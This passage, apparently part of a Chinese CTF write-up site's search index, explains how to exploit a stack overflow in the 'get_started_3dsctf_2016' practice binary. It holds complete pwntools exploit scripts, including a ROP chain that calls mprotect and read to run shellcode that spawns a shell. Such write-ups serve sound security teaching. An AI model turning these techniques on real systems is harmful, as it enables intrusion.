fclose(v3); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"linker/statically_linked/#_6","text":"\u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: `/home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016', file type elf32-i386. [0] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [1] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [2] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [21] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [22] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [23] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32(mprotect_addr) + p32(got_plt) + p32(0x200) + p32(0x7) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode \u5230 .got.plt \u4e0a\u9762\uff0c\u63a5\u7740\u8df3\u8f6c\u5230 .got.plt \u5373\u53ef\uff1a payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) \u5b9e\u9645\u8fd0\u884c\u540e\u4f1a\u5361\u5728 read \u51fd\u6570\uff0c\u901a\u8fc7\u8c03\u8bd5\u5bf9\u6bd4\u6b63\u5e38 read \u51fd\u6570\uff0c\u662f\u51e0\u4e2a\u5bc4\u5b58\u5668\u7684\u95ee\u9898\u3002\u5728 mprotect \u8fd0\u884c\u5b8c\u4e4b\u540e\uff0c\u9700\u8981 pop \u5b58\u653e 3 \u4e2a\u53c2\u6570\u7684\u5bc4\u5b58\u5668\uff0c\u7528 ROPgadget \u627e\u5c31\u884c\u4e86\u3002 read \u4e5f\u6709 3 \u4e2a\u53c2\u6570\uff0c\u4f46\u662f\u5b9e\u9645\u6d4b\u8bd5\u4e0d\u9700\u8981 popgadget \u5904\u7406\uff0c\u76f4\u63a5\u53ef\u4ee5\u8df3\u8f6c\u5c31\u7701\u7565\u3002 \u6574\u4f53 payload \u6784\u9020\uff1a payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200)","title":"\u601d\u8def"},{"location":"linker/statically_linked/#exp","text":"","title":"exp"},{"location":"linker/statically_linked/#_7","text":"from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",26536) elf = ELF(\"./get_started_3dsctf_2016\") get_flag = elf.sym['get_flag'] payload = 'a'*0x38# + 'b'*0x4 payload += p32(get_flag)+p32(0xdeadbeef)+p32(0x308CD64F)+p32(0x195719D1) #p.recvuntil(\"Qual\") gdb.attach(p) p.sendline(payload) p.interactive()","title":"\u4ec5\u6808\u6ea2\u51fa"},{"location":"linker/statically_linked/#mprotect","text":"\u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive()","title":"\u6808\u6ea2\u51fa+mprotect"},{"location":"linker/statically_linked/#2017-pwn300","text":"32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300"}]}